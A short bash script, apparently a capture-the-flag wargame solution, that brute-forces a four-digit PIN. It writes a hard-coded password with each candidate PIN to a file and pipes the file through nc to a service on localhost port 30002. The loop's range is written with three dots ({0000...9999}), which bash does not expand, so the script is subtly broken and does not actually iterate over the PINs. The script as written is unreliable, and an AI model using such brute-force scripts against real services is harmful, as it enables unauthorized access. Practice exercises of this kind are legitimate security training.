#! /bin/bash

for i in {0000...9999}
do
    echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i >> /tmp/tmp.8hCvuPbWXp/attempts.txt
    echo "Pin attempt: $i"
done

cat /tmp/tmp.8hCvuPbWXp/attempts.txt | nc localhost 30002 > /tmp/tmp.8hCvuPbWXp/output.txt